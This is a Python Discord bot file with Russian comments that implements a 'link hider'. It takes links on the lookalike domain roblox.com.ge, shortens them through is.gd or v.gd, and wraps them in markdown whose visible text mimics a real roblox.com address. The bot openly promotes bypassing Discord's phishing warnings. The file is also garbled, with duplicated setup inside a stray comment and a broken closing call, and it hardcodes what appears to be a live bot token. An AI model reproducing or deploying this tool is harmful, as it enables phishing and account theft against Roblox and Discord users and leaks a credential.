import os
import discord
from discord import ui, app_commands
from discord.ext import commands
import aiohttp
import re

TOKEN = os.getenv("TOKEN")  # Берем токен из переменной окружения

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# ВСЕ ОСТАЛЬНЫЕ ФУНКЦИИ ТВОЕГО БОТА...
# (import discord
from discord import ui, app_commands
from discord.ext import commands
import aiohttp
import asyncio
import traceback
import re

TOKEN = os.getenv("TOKEN")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

class LinkModal(ui.Modal, title="Paste Your Roblox Link"):
    def __init__(self):
        super().__init__(timeout=300)
    
    link = ui.TextInput(
        label="Roblox Link *",
        placeholder="https://roblox.com.ge/users/123456/profile или https://roblox.com.ge/games/...",
        style=discord.TextStyle.paragraph,
        required=True,
        min_length=10,
        max_length=500
    )
    
    def format_display_url(self, original_url):
        """Преобразует исходную ссылку в формат https*://*www.roblox.com/..."""
        # Извлекаем путь после домена
        # Убираем домен roblox.com.ge и все, что до / после него
        match = re.search(r'roblox\.com\.ge(.*)', original_url)
        if match:
            path = match.group(1)
        else:
            # fallback: пытаемся взять всё после https://
            path = re.sub(r'^https?://[^/]+', '', original_url)
        
        # Формируем итоговую ссылку
        return f"https*://*www.roblox.com{path}"
    
    async def shorten_url_isgd(self, session, original_url):
        """Сокращает ссылку через is.gd (эмуляция формы)"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://is.gd',
                'Referer': 'https://is.gd/',
            }
            
            data = {
                'url': original_url,
                'shorturl': '',
                'submit': 'Shorten!'
            }
            
            async with session.post('https://is.gd/create.php', 
                                   data=data, 
                                   headers=headers,
                                   timeout=15,
                                   allow_redirects=True) as response:
                
                text = await response.text()
                
                # Ищем ссылку is.gd в ответе
                patterns = [
                    r'https://is\.gd/[a-zA-Z0-9]+',
                    r'value="(https://is\.gd/[^"]+)"',
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, text)
                    if match:
                        result = match.group(1) if 'value="' in pattern else match.group(0)
                        if result and result.startswith('https://is.gd/'):
                            print(f"✅ is.gd success: {result}")
                            return result
        except Exception as e:
            print(f"is.gd error: {e}")
        return None
    
    async def shorten_url_vgd(self, session, original_url):
        """Запасной метод для v.gd"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            data = {
                'url': original_url,
                'shorturl': '',
                'Publish': 'Create'
            }
            
            async with session.post('https://v.gd/create.php', 
                                   data=data, 
                                   headers=headers,
                                   timeout=15) as response:
                
                text = await response.text()
                match = re.search(r'https://v\.gd/[a-zA-Z0-9]+', text)
                if match:
                    print(f"✅ v.gd success: {match.group(0)}")
                    return match.group(0)
        except Exception as e:
            print(f"v.gd error: {e}")
        return None
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True, thinking=True)
        
        original_url = self.link.value.strip()
        
        if not original_url.startswith(('http://', 'https://')):
            original_url = 'https://' + original_url
        
        try:
            print(f"\n🔗 Processing: {original_url}")
            
            hidden_url = None
            
            async with aiohttp.ClientSession() as session:
                # Пробуем is.gd
                print("📡 Trying is.gd...")
                hidden_url = await self.shorten_url_isgd(session, original_url)
                
                # Если is.gd не сработал, пробуем v.gd
                if not hidden_url:
                    print("📡 Trying v.gd...")
                    hidden_url = await self.shorten_url_vgd(session, original_url)
            
            user = interaction.user
            
            if hidden_url:
                # Форматируем отображаемую ссылку в нужный вид
                display_url = self.format_display_url(original_url)
                
                # Формируем финальное сообщение
                message = f"[{display_url}]({hidden_url})"
                
                print(f"📨 Sending message: {message}")
                
                try:
                    await user.send(message)
                    await interaction.followup.send(
                        "✅ **Done!** Check your **Direct Messages**!",
                        ephemeral=True
                    )
                except discord.Forbidden:
                    await interaction.followup.send(
                        "❌ **Cannot send a DM!** Please enable DMs in your Discord settings.",
                        ephemeral=True
                    )
            else:
                await interaction.followup.send(
                    f"❌ **Failed to shorten link!**\n\n"
                    f"**Your link:** `{original_url}`\n\n"
                    f"Try shortening manually at https://is.gd",
                    ephemeral=True
                )
                
        except Exception as e:
            print(f"❌ Error: {e}")
            print(traceback.format_exc())
            await interaction.followup.send(
                f"❌ **Error:** {str(e)[:200]}",
                ephemeral=True
            )

@bot.tree.command(name="linkhider", description="Hide your Roblox link and bypass Discord warnings")
async def linkhider(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔗 LINK HIDER",
        description=(
            "**Hide your link and bypass Discord warnings & errors**\n\n"
            "**WHAT IS LINK HIDER?**\n"
            "• A tool that converts your link into a safe format that bypasses Discord's phishing warnings and URL blocks\n\n"
            "**WHY USE IT?**\n"
            "• No more warning pages\n"
            "• Bypass Discord URL filters\n"
            "• Clean redirects\n"
            "• **100% working method**\n\n"
            "**HOW IT WORKS**\n"
            "1. Click 'CREATE HYPERLINK' below\n"
            "2. Paste your link in the window\n"
            "3. Get your hidden link in DMs\n"
            "4. Share safely anywhere"
        ),
        color=discord.Color.blue()
    )
    embed.set_footer(text="GODZILLA • Link Hider")
    
    view = discord.ui.View()
    view.add_item(discord.ui.Button(
        label="CREATE HYPERLINK",
        style=discord.ButtonStyle.primary,
        custom_id="create_link"
    ))
    
    await interaction.response.send_message(embed=embed, view=view)

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.component:
        if interaction.data.get("custom_id") == "create_link":
            modal = LinkModal()
            await interaction.response.send_modal(modal)

@bot.tree.command(name="ping", description="Check if bot is working")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"🏓 Pong! Latency: {round(bot.latency * 1000)}ms", ephemeral=True)

@bot.event
async def on_ready():
    print(f'✅ Bot {bot.user} is online!')
    await bot.tree.sync()
    print("✅ Commands synced!")

if __name__ == "__main__":
    bot.run(TOKEN))

if __name__ == "__main__":
    bot.run("MTQ4ODUyOTY4MjY0MjIzOTY1OQ.GvqrYW.mkybZ1pN04dFCujruq0SAVmmdb_GwH35W2P9MQ")